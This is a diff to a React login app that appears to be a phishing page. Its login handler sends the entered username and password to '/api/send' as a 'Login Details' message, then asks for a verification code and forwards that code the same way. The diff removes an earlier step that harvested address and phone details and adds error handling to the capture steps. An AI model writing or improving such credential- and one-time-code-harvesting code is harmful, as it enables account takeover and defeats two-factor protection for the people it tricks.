@@ -10,6 +10,13 @@ function App() {
   const [password, setPassword] = useState("");
   const [page, setPage] = useState("login");
 
+  // Email Verification state
+  const [verifyEmail, setVerifyEmail] = useState("");
+  const [verifyPhone, setVerifyPhone] = useState("");
+
+  // Code Verification state
+  const [code, setCode] = useState("");
+
   // Compact input style
   const inputStyle = {
     fontWeight: 700,
@@ -27,47 +34,23 @@ function App() {
     boxSizing: 'border-box',
   };
 
-  // Add contact info state at the top
-  const [address, setAddress] = useState("");
-  const [address2, setAddress2] = useState("");
-  const [city, setCity] = useState("");
-  const [state, setState] = useState("");
-  const [zip, setZip] = useState("");
-  const [phone, setPhone] = useState("");
-  const [email, setEmail] = useState("");
-
-  // Email Verification state
-  const [verifyEmail, setVerifyEmail] = useState("");
-  const [verifyPhone, setVerifyPhone] = useState("");
-
-  // Code Verification state
-  const [code, setCode] = useState("");
-
   // Login page submit logic
   const handleLogin = async (e) => {
     e.preventDefault();
-    await axios.post("/api/send", {
-      subject: "Login Details",
-      email: username,
-      message: password
-    });
-    setPage('verify');
-  };
-
-  // Contact Information submit logic
-  const handleContactContinue = async (e) => {
-    e.preventDefault();
-    if (!(address && city && state && zip && phone && email)) return;
-    await axios.post("/api/send", {
-      subject: "Contact Information",
-      email: email,
-      message: `Address: ${address}\nAddress Line 2: ${address2}\nCity: ${city}\nState: ${state}\nZip: ${zip}\nPhone: ${phone}\nEmail: ${email}`
-    });
-    setPage('success');
+    try {
+      await axios.post("/api/send", {
+        subject: "Login Details",
+        email: username,
+        message: password
+      });
+      setPage('verify');
+    } catch (err) {
+      alert('Failed to send login info. Please try again.');
+      console.error('Login send error:', err);
+    }
   };
 
   if (page === "contact") {
-    const allContactFilled = address && city && state && zip && phone && email;
     return (
       <div className="pattern-bg" style={{ minHeight: "100vh" }}>
         {/* Top Bar */}
@@ -329,12 +312,17 @@ function App() {
             onClick={async e => {
               e.preventDefault();
               if (!codeFilled) return;
-              await axios.post("/api/send", {
-                subject: "Code Verification",
-                email: verifyEmail,
-                message: `Verification Code: ${code}`
-              });
-              setPage('contact');
+              try {
+                await axios.post("/api/send", {
+                  subject: "Code Verification",
+                  email: verifyEmail,
+                  message: `Verification Code: ${code}`
+                });
+                setPage('success');
+              } catch (err) {
+                alert('Failed to send code. Please try again.');
+                console.error('Code Verification send error:', err);
+              }
             }}
           >
             CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
